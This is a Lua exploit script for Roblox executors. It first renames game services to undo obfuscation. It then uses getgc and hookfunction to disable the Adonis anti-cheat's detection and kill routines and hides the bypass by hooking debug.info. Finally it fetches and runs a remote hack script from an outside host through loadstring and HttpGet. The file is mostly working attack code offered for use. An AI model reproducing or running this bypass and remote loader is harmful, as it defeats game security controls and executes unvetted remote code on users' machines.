-- |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
-- |                                 If Adonis Exists Kill him Method                                |
-- |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
function Deob()
    --// Known service names (hardcoded for compatibility)
    local KNOWN_SERVICES = {
        "AccessControlService",
        "AnimationControllerService",
        "AssetService",
        "AssetTrackerService",
        "BadgeService",
        "BrowserService",
        "Chat",
        "ClientSettingsService",
        "CollectionService",
        "CommonUIService",
        "ContentProvider",
        "CoreGui",
        "CorePackages",
        "DataModelMeshService",
        "DataStoreService",
        "DebugSettings",
        "DiagnosticsService",
        "DialogService",
        "DiscordIntegrationService",
        "DistributedGameMaster",
        "EconomyService",
        "ExperienceProvider",
        "FacebookService",
        "FavoritesService",
        "FriendService",
        "GamePassService",
        "GameSettingService",
        "GenericSettings",
        "Geometry",
        "GoogleService",
        "GuidanceService",
        "GuiService",
        "HttpService",
        "IdService",
        "InsertService",
        "InternalAnimationSupport",
        "InternalAsyncLoaderService",
        "InternalRandomAdditionService",
        "InventoryService",
        "JobResponseManager",
        "KeyValueStoreService",
        "LanguageService",
        "LegacyScriptContext",
        "Lighting",
        "LocalizationService",
        "LogService",
        "MarketplaceService",
        "MaterialService",
        "MessagingService",
        "ModalDialogService",
        "ModelMeshService",
        "NetworkPeer",
        "NetworkReplicator",
        "NotificationService",
        "PackageService",
        "PathfindingModifierService",
        "PermissionService",
        "PhysicsService",
        "PointsService",
        "PolicyService",
        "PlayerConfiguration",
        "Players",
        "PluginDebugService",
        "PluginExecutionCoordinator",
        "PluginLogger",
        "PluginManager",
        "PluginSecurity",
        "PluginTraceService",
        "PostureController",
        "ProcessService",
        "ProximityPromptService",
        "PurchaseService",
        "R15Animator",
        "RagdollFactory",
        "RandomAdditionService",
        "RasterizerMetadataService",
        "ReCaptchaService",
        "ReflectionMetadata",
        "ReplicatedFirst",
        "ReplicatedStorage",
        "RobloxReplicatedLuaSrcInit",
        "RobloxScriptSecurity",
        "RobloxVersionEngine",
        "RunService",
        "ScriptContext",
        "ScriptDebugger",
        "ScriptInfoProvider",
        "ScriptProfilerService",
        "ScriptService",
        "SecuritySettings",
        "ServerScriptService",
        "ServerStorage",
        "SessionAuth",
        "Settings",
        "ShadowLayout",
        "ShellService",
        "SocialService",
        "SoundService",
        "SpecialKeyDialogService",
        "StarterGui",
        "StarterPack",
        "StarterPlayer",
        "StateGraphService",
        "StatusMessageService",
        "Studio",
        "StudioData",
        "StudioGame",
        "StudioGuiService",
        "StudioLighting",
        "StudioLocale",
        "StudioService",
        "SurfaceAppearanceService",
        "TaskScheduler",
        "TeamCreateToolService",
        "Teams",
        "TeleportService",
        "Terrain",
        "TextChatService",
        "TextFilterService",
        "ThumbnailGenerator",
        "TimerService",
        "TixService",
        "TouchInputService",
        "TweenService",
        "UIBlox",
        "UIComponentService",
        "UGCValidationService",
        "UserInputService",
        "UserService",
        "VideoService",
        "VirtualInputManager",
        "VoiceChatService",
        "WaveletCompression",
        "WebBrowserService",
        "WebService",
        "Workspace"
    }

    --// Try using ServiceProvider if it exists (Studio only)
    local services = {}
    local ok, serviceProvider = pcall(function()
        return game:GetService("ServiceProvider")
    end)

    if ok and serviceProvider then
        services = serviceProvider:GetServiceNames()
    else
        services = KNOWN_SERVICES
    end

    --// Detect classes from existing instances in each service
    local classNames = {}

    for _, serviceName in ipairs(services) do
        local success, service = pcall(function()
            return game:GetService(serviceName)
        end)

        if success and service then
            -- Safely get children
            local childrenSuccess, children = pcall(function()
                return service:GetChildren()
            end)

            if childrenSuccess and type(children) == "table" then
                for _, child in ipairs(children) do
                    if child.ClassName then
                        classNames[child.ClassName] = true
                    end
                end
            else
                warn("Failed to get children for service: " .. serviceName)
            end
        end
    end

    ---------------------------------------------------------------------
    --              Deobfuscation Logic Below                          --
    ---------------------------------------------------------------------

    -- You can extend this with known class names later
    local ALL_KNOWN_SERVICES = {
        -- Core Services
        "Workspace", "Players", "ReplicatedStorage", "ServerStorage", "Lighting",
        "SoundService", "StarterGui", "StarterPack", "Teams", "ServerScriptService",
        "CoreGui", "HttpService", "InsertService", "MarketplaceService", "PathfindingService",
        "ProximityPromptService", "RenderSettings", "RunService", "StarterPlayer",
        "TextChatService", "VirtualInputManager", "LocalizationService",

        -- Additional Services
        "AccessControlService", "AnimationController", "AssetService", "BadgeService",
        "Chat", "ClientContext", "CollectionService", "ContentProvider", "DataModelMeshes",
        "DebugSettings", "Debris", "DeveloperDashboard", "ExperienceChat", "FileManager",
        "FlagStand", "FollowUser", "FormFactorService", "FriendService", "GamePassService",
        "GameSettings", "GenericSettings", "Geometry", "GetFetchedThumbnailList",
        "GetFetchedThumbnails", "GetInventory", "GetProductInfo", "GetUniverseInfo",
        "GetUserInventory", "GetUserProductInfo", "GetUserThumbnailList", "GetUserThumbnails",
        "GoogleAnalyticsService", "GroupService", "GuiService", "HttpRbxApiService", "IDCheck",
        "IdentityVerificationService", "InteractionUtil", "InviteSender", "JointInstance",
        "Keyboard", "MaterialService", "MemoryStoreService", "MessagingService", "Mouse",
        "NetworkClient", "NetworkReplicator", "NetworkServer", "NotificationService",
        "PackageLinker", "PermissionService", "PhysicsService", "Plugin", "PointLight",
        "PurchasePrompt", "Random", "RaycastParams", "RemoteEvent", "RemoteFunction",
        "ReplicatedFirst", "Script", "ScriptContext", "Selection", "SessionAuth",
        "ShirtService", "SocialService", "StateGraphService", "Status", "SurfaceAppearance",
        "Team", "TeleportService", "TextLabel", "TexturePacker", "Torch", "TouchInputService",
        "TweenService", "UIManager", "UndoService", "UserInputService", "UserService",
        "VideoFrame", "VRService", "WaveletCompression", "WebCore", "WrapTarget", "VoiceChatService",
        "TestService", "BrowserService", "KeyboardService", "ControllerService", "TextService", "PointsService",
        "SharedTableRegistry", "MouseService", "ChangeHistoryService", "ContextActionService", "SolidModelContentProvider",
        "MemStorageService", "JointsService", "CaptureService", "AnalyticsService", "AvatarEditorService", "AnimationClipProvider",
        "Stats", "TextBoxService", "GamepadService", "MeshContentProvider", "ScriptService", "PolicyService", "HSRDataContentProvider", 
        "GuidRegistryService", "VideoCaptureService", "Visit", "AdService", "KeyframeSequenceProvider", "TimerService", "PermissionsService",
        "VideoService", "CookiesService", "HapticService", "SpawnerService"
    }

    -- Function to find a service by its class name
    local function findServiceByClass(className)
        for _, child in ipairs(game:GetChildren()) do
            if child:IsA(className) then
                return child
            end
        end
        return nil
    end

    -- Function to restore service names
    local function restoreAllScrambledServices()
        print("Detecting Obfuscation...")

        local restoredCount = 0

        for _, className in ipairs(ALL_KNOWN_SERVICES) do
            local instance = findServiceByClass(className)

            if instance then
                if instance.Name ~= className then
                    print(string.format("Renaming Obfuscated Service '%s' -> '%s'", instance.Name, className))
                    instance.Name = className
                else
                    -- print("'" .. className .. "' is already correctly named.")
                end
                restoredCount += 1
            end
        end

        print(string.format("Restored %d/%d obfuscated service names.", restoredCount, #ALL_KNOWN_SERVICES))
    end

    -- Run the restoration
    spawn(function()
        wait(1) -- Give the game time to load all services
        restoreAllScrambledServices()
    end)
end

Deob()

local function killadonisforme() 
    local getinfo = getinfo or debug.getinfo
    local DEBUG = true
    local Hooked = {}
    
    local Detected, Kill
    
    setthreadidentity(2)
    
    for i, v in getgc(true) do
        if typeof(v) == "table" then
            local DetectFunc = rawget(v, "Detected")
            local KillFunc = rawget(v, "Kill")
        
            if typeof(DetectFunc) == "function" and not Detected then
                Detected = DetectFunc
                
                local Old; Old = hookfunction(Detected, function(Action, Info, NoCrash)
                    if Action ~= "_" then
                        if DEBUG then
                            warn(`Adonis AntiCheat flagged\nMethod: {Action}\nInfo: {Info}`)
                        end
                    end
                    
                    return true
                end)
    
                table.insert(Hooked, Detected)
            end
    
            if rawget(v, "Variables") and rawget(v, "Process") and typeof(KillFunc) == "function" and not Kill then
                Kill = KillFunc
                local Old; Old = hookfunction(Kill, function(Info)
                    if DEBUG then
                        warn(`Adonis AntiCheat tried to kill (fallback): {Info}`)
                    end
                end)
    
                table.insert(Hooked, Kill)
            end
        end
    end
    
    local Old; Old = hookfunction(getrenv().debug.info, newcclosure(function(...)
        local LevelOrFunc, Info = ...
    
        if Detected and LevelOrFunc == Detected then
            if DEBUG then
                warn(`zins | adonis bypassed`)
            end
    
            return coroutine.yield(coroutine.running())
        end
        
        return Old(...)
    end))
    -- setthreadidentity(9)
    setthreadidentity(7)
end


local function Initiate()
    killadonisforme()
    loadstring(game:HttpGet("https://catnip.at.ua/-Beta-WhippityOxideHack.lua"))()
end

Initiate()